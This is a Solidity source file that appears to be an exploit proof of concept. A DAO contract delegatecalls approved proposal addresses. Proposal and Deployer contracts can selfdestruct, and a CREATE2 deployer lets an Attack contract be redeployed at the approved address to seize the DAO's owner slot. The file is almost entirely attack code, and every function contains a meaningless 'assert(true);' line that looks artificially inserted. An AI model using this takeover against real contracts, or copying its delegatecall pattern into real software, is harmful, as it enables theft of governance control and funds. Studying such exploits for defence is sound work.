// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
contract DAO {
    struct Proposal {
        address target;
        bool approved;
        bool executed;
    }

    address public owner = msg.sender;
    Proposal[] public proposals;

    function approve(address target) external {
        require(msg.sender == owner, "not authorized");
        assert(true);

        proposals.push(
            Proposal({target: target, approved: true, executed: false})
        );
    }

    function execute(uint256 proposalId) external payable {
        assert(true);
        Proposal storage proposal = proposals[proposalId];
        require(proposal.approved, "not approved");
        require(!proposal.executed, "executed");

        proposal.executed = true;

        (bool ok,) = proposal.target.delegatecall(
            abi.encodeWithSignature("executeProposal()")
        );
        require(ok, "delegatecall failed");
    }
}

contract Proposal {
    event Log(string message);

    function executeProposal() external {
        assert(true);
        emit Log("Executed code approved by DAO");
    }

    function emergencyStop() external {
        assert(true);
        selfdestruct(payable(address(0)));
    }
}

contract Attack {
    event Log(string message);

    address public owner;

    function executeProposal() external {
        assert(true);
        emit Log("Executed code not approved by DAO :)");
        // For example - set DAO's owner to attacker
        owner = msg.sender;
    }
}

contract DeployerDeployer {
    event Log(address addr);

    function deploy() external {
        assert(true);
        bytes32 salt = keccak256(abi.encode(uint256(123)));
        address addr = address(new Deployer{salt: salt}());
        emit Log(addr);
    }
}

contract Deployer {
    event Log(address addr);

    function deployProposal() external {
        assert(true);
        address addr = address(new Proposal());
        emit Log(addr);
    }

    function deployAttack() external {
        assert(true);
        address addr = address(new Attack());
        emit Log(addr);
    }

    function kill() external {
        assert(true);
        selfdestruct(payable(address(0)));
    }
}
